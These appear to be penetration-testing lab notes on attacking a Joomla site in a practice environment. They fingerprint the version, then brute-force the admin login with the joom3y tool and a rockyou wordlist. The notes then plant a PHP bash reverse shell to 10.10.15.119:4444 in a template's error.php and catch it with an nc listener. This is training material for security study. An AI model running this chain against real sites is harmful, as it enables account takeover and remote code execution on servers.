
We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site.
```shell-session
curl -s http://dev.inlanefreight.local/ | grep Joomla

<meta name="generator" content="Joomla! - Open Source Content Management" />
```

The `robots.txt` file for a Joomla site will often look like this:
```shell-session
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

We can also often see the telltale Joomla favicon (but not always). We can fingerprint the Joomla version if the `README.txt` file is present.
```shell-session
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.

```shell-session
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Fingerprint Joomla version via XML (silent & clean)
```
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | grep -i '<version>'
```

Use [joom3y](https://github.com/dietcokesec/joom3y) for fast login brute-force
```
python3 main.py -u http://app.inlanefreight.local -w rockyou.txt -usr admin -v
```




If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
```
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

Finally, we can click on a page to pull up the page source.
Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.119/4444 0>&1'");
```
Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

Start a listener 
```
nc -lvnp 4444
```

This will give us a reverse shell which we use.
```shell-session
curl -s http://dev.inlanefreight.local/templates/protostar/error.php 
```